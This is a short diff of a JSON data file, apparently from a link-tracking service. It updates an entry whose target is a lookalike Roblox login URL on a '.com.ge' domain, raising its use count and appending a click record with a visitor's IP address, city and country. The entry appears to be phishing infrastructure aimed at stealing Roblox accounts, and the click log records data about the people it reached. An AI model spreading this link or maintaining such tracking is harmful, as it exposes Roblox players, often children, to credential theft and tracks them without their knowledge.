@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1003,
+    "useCount": 1004,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8144,6 +8144,14 @@
         "city": "Lima",
         "flag": "🇵🇪",
         "countryCode": "PE"
+      },
+      {
+        "timestamp": 1777223412202,
+        "ip": "91.82.250.88",
+        "country": "Hungary",
+        "city": "Budapest",
+        "flag": "🇭🇺",
+        "countryCode": "HU"
       }
     ]
   },
